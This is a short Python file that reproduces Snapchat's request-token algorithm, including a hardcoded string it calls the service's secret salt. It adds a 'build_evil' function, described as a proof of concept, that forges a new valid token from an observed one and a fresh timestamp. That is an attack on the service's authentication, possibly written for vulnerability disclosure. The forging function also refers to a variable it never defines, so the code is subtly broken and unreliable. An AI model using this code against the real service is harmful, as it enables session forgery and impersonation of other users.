from hashlib import sha256
import time

def build_token(server_token, timestamp, secret="iEk21fuwZApXlz93750dmW22pw389dPwOk",
        pattern="0001110111101110001111010101111011010001001110011000110001000110"):
    """
    Standard method to build a token for a request to snapchat
    @server_token the auth_token given on login
    @timestamp the timestamp string of the current request
    @secret snapchat's 'secret' salt
    @pattern snapchat's pattern for selecting from the two hashes
    """
    #build hashes
    sha = sha256()
    sha.update(secret + server_token)
    hash0 = sha.hexdigest()
    sha = sha256()
    sha.update(timestamp + secret)
    hash1 = sha.hexdigest()

    # zip
    output = [hash0[i] if pattern[i] == '0' else hash1[i] for i in range(len(hash0))]
    return ''.join(output)

def build_evil(original, timestamp, secret="iEk21fuwZApXlz93750dmW22pw389dPwOk",
        pattern="0001110111101110001111010101111011010001001110011000110001000110"):
    """
    Proof of concept to generate a new token from an observed token and a new timestamp
    """
    sha = sha256()
    sha.update(timestamp + secret)
    hash1 = sha.hexdigest()

    output = [original[i] if pattern[i] == '0' else hash1[i] for i in range(len(hash0))]
    return ''.join(output)

def timestamp():
    """
    Get the current time in timestamp form
    """
    return str(int(time.time() * 100))
